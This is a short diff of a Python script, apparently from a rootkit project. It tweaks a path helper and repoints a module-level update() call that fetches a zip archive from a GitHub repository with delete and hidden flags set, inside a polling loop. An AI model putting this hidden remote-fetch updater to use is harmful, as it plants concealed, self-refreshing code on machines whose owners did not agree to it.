@@ -8,7 +8,7 @@ def getpath(change=False):
 def getFileName(Path=""):
     return os.path.basename(__file__)
 def getNameDir(data):
-    return (data.split("/")[len(data.split("/"))-3])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
+    return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
     
 def supDir(data):
     shutil.rmtree(data)
@@ -118,4 +118,4 @@ def update(data, delete=False, hidden=False, pathArrivingFiles=""):
             loop = loop + 1
             time.sleep(20)
 
-update("https://github.com/N0SAFE/pythonRootKit/archive/main.zip", delete=True, hidden=True)
+update("https://github.com/N0SAFE/kit/archive/refs/heads/main.zip", delete=True, hidden=True)
